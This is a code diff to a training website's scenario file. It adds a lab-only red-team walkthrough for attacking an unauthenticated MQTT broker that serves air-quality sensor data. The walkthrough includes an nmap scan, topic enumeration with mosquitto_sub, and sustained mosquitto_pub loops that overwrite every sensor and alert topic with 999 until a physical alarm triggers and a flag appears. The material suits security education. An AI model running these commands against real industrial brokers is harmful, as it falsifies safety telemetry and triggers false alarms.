@@ -1367,53 +1367,169 @@ finally:
 const industryScenarios = {
   red: {
     kicker: "Red Team Scenario",
-    title: "Industrial Attack Surface Training",
-    summary: "Students simulate a lab-only MQTT sensor spoofing incident from a Kali machine and observe fake industrial values appearing live in the Industrial dashboard.",
-    badges: ["Kali machine", "MQTT broker 172.16.17.207", "Node-RED dashboard"],
+    title: "Industry Monitoring - MQTT Spoofing Attack",
+    summary: "Students follow an authorized lab-only walkthrough against the Industry Monitoring dashboard where an exposed MQTT broker accepts unauthenticated subscriptions and publishes for ZPHS01B air-quality telemetry.",
+    badges: ["MQTT", "Broker 172.16.17.207", "TCP/1883", "ZPHS01B"],
     steps: [
-      "Connect Kali to the Phygital Lab network.",
-      "Open the Industrial dashboard and keep it visible during the simulation.",
-      "Run single.py first to spoof only the NO2 topic and watch one gauge change.",
-      "Run all.py to scan visible MQTT topics and publish fake values to all discovered topics.",
-      "Stop the script with Ctrl+C and record which values changed."
+      "Reconnaissance: scan the approved broker target and confirm TCP/1883 is open with the mqtt service.",
+      "Enumerate topics using mosquitto_sub with the # wildcard to capture the full topic map.",
+      "Map ZPHS01B topics to dashboard gauges and record normal baseline values.",
+      "Spoof one NO2 topic with mosquitto_pub and observe the gauge maxing out.",
+      "Escalate to all sensor and alert topics with a sustained loop publishing 999.",
+      "Stop the attack with Ctrl+C and confirm real sensor values recover automatically."
     ],
+    actionTitle: "Full Walkthrough",
     commands: `==============================
-SETUP
+PHASE 1 - RECONNAISSANCE
 ==============================
-Move to the student script folder:
-  cd /home/kali/documents
+nmap -p 1883 172.16.17.207
 
-Install the MQTT dependency if needed:
-  python3 -m pip install paho-mqtt
+Output:
+PORT     STATE SERVICE
+1883/tcp open  mqtt
+MAC Address: BC:24:11:C0:C9:02 (Proxmox Server Solutions GmbH)
 
-
-==============================
-SINGLE-SENSOR SIMULATION
-==============================
-Run the one-topic simulation:
-  python3 single.py
-
-Student task:
-  Watch the dashboard and record which single gauge changes.
+What you learn:
+- Port 1883 is open
+- Service confirmed as mqtt
+- Hosted on a Proxmox server
+- No authentication required
+- No credentials needed to connect
 
 
 ==============================
-MULTI-SENSOR SIMULATION
+PHASE 2 - TOPIC ENUMERATION
 ==============================
-Run the all-topic simulation:
-  python3 all.py
+mosquitto_sub -h 172.16.17.207 -t "#" -v
 
-Student task:
-  Record discovered topics, fake values, affected gauges, and dashboard behavior.
+Output:
+ZPHS01B/P1.0          17
+ZPHS01B/P2.5          22
+ZPHS01B/P10           24
+ZPHS01B/CO2           1124
+ZPHS01B/TEMP          30.3
+ZPHS01B/HUM           86
+ZPHS01B/CH2O          0.01
+ZPHS01B/CO            0.5
+ZPHS01B/O3            0.02
+ZPHS01B/NO2           0.23
+ZPHS01B/VOC           0
+sensor/value/alert    33
+
+What you learn:
+- 11 air quality sensor topics all under ZPHS01B/ prefix
+- 1 separate alert topic: sensor/value/alert
+- All publishing in real time with no auth
+- Normal baseline values captured
+- # wildcard gives full topic map instantly
 
 
 ==============================
-CLEANUP
+PHASE 3 - UNDERSTAND THE TARGET
 ==============================
-Stop the script:
+Map topics to dashboard gauges:
+ZPHS01B/P1.0         -> PM 1.0 gauge      (ug/m3, range 0-1000)
+ZPHS01B/P2.5         -> PM 2.5 gauge      (ug/m3, range 0-1000)
+ZPHS01B/P10          -> PM 10 gauge       (ug/m3, range 0-1000)
+ZPHS01B/CO2          -> CO2 gauge         (ppm, range 0-5000)
+ZPHS01B/TEMP         -> Temperature gauge (deg C, range -10-100)
+ZPHS01B/HUM          -> Humidity gauge    (%RH, range 20-100)
+ZPHS01B/CH2O         -> CH2O gauge        (mg/m3, range 0-7)
+ZPHS01B/CO           -> CO gauge          (ppm, range 0-500)
+ZPHS01B/O3           -> O3 gauge          (ppm, range 0-10)
+ZPHS01B/NO2          -> NO2 gauge         (ppm, range 0-10)
+ZPHS01B/VOC          -> VOC gauge         (grade, range 0-5)
+sensor/value/alert   -> Physical alarm buzzer
+
+
+==============================
+PHASE 4 - SINGLE SENSOR SPOOF
+==============================
+# One-time publish
+mosquitto_pub -h 172.16.17.207 -t "ZPHS01B/NO2" -m "999"
+
+# Sustained publish - keeps gauge at 999
+while true; do
+  mosquitto_pub -h 172.16.17.207 -t "ZPHS01B/NO2" -m "999"
+  sleep 0.1
+done
+
+Command breakdown:
+mosquitto_pub          -> MQTT publish client
+-h 172.16.17.207       -> broker IP
+-t "ZPHS01B/NO2"       -> target topic
+-m "999"               -> spoofed value
+sleep 0.1              -> republish every 100ms
+
+Dashboard impact:
+Before: NO2 = 0.23 ppm  (normal, green)
+After:  NO2 = 999 ppm   (maxed, red)
+
+
+==============================
+PHASE 5 - FULL SENSOR SPOOF
+==============================
+while true; do
+  for topic in ZPHS01B/P1.0 ZPHS01B/P2.5 ZPHS01B/P10 \
+               ZPHS01B/CO2 ZPHS01B/TEMP ZPHS01B/HUM \
+               ZPHS01B/CH2O ZPHS01B/CO ZPHS01B/O3 \
+               ZPHS01B/NO2 ZPHS01B/VOC sensor/value/alert; do
+    mosquitto_pub -h 172.16.17.207 -t "$topic" -m "999"
+  done
+  sleep 0.02
+done
+
+What happens:
+- Every 20ms, 12 publish commands fire
+- Each topic is overwritten with 999
+- Real sensor is still publishing real values
+- Attacker publishes faster and wins the race
+- Dashboard shows all gauges maxed red
+- Physical alarm triggers
+
+
+==============================
+PHASE 6 - OBSERVE IMPACT
+==============================
+Before attack:
+  All gauges -> normal green/yellow readings
+  CO2        -> 1124 ppm
+  TEMP       -> 30 deg C
+  HUM        -> 86%
+  NO2        -> 0.23 ppm
+  Alert      -> 33
+
+After full spoof:
+  ALL gauges     -> 999 (maxed red)
+  Physical alarm -> TRIGGERED
+  Dashboard      -> full red alert state
+  Flag           -> appears
+
+
+==============================
+PHASE 7 - CLEANUP
+==============================
+Stop the attack:
   Ctrl+C
 
-Confirm dashboard values return to normal before ending the drill.`,
+Dashboard auto-recovers when real sensor values resume publishing and overwrite the spoofed 999 values. No manual restore needed; the real sensor wins back once the attack stops.
+
+
+==============================
+FULL ATTACK CHAIN SUMMARY
+==============================
+nmap -p 1883 172.16.17.207
+  -> Port 1883 open, MQTT broker confirmed
+  -> No authentication
+  -> mosquitto_sub -t "#" -v
+  -> 11 sensor topics plus alert topic discovered
+  -> Full topic map captured
+  -> mosquitto_pub -t "ZPHS01B/NO2" -m "999"
+  -> Single gauge maxed, impact confirmed
+  -> while loop publishes all 12 topics as 999
+  -> Full dashboard alarm state
+  -> Physical alarm triggered
+  -> FLAG captured`,
     links: [
       { label: "Open Industrial Dashboard", href: industryDashboardUrl }
     ]
